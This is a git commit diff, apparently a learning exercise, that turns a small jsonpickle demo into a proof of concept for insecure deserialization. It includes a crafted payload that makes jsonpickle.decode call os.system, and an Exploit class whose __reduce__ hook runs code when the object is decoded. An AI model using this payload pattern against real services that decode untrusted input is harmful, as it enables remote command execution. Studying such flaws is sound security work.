6c72be35a59e5d7249714628869e17c3bb5ebe8d
Mihir <mihir.xtha@gmail.com>
2020-04-24 16:19:15 -0400

    exploit example

--- testEnvironment/playingAround.py
+++ testEnvironment/playingAround.py
@@ -1,20 +1,32 @@
+import os
 import jsonpickle
 
-
-class T:
-    def __init__(self, name):
-        self.name = name
-        self.age = None
-        self.ethnicity = None
-        self.hairColor = None
-        self.height = None
-        self.weight = None
-        self.race = "Human"
+jsonpickle.decode('{"py/reduce": [{"py/function": "os.system"}, ["dir"]]}', safe=True)
 
 
-t = T("Mihir")
-encT = jsonpickle.encode(t, nullValues=False)
-print(encT)
-decT = jsonpickle.decode(encT)
+# Exploit that we want the target to unpickle
+class Exploit(object):
+    def __reduce__(self):
+        # Note: this will only list files in your directory.
+        # It is a proof of concept.
+        print("I can do whatever I want from here.")
+        # os.chdir("../")
+        # files = os.listdir()
+        # for file in files:
+        #     print(file)
 
 
+def serialize_exploit():
+    shellcode = jsonpickle.encode(Exploit())
+    print(shellcode)
+    return shellcode
+
+
+def insecure_deserialize(exploit_code):
+    jsonpickle.decode(exploit_code)
+
+
+if __name__ == '__main__':
+    shellcode = serialize_exploit()
+    print('Yar, here be yer files.')
+    insecure_deserialize(shellcode)
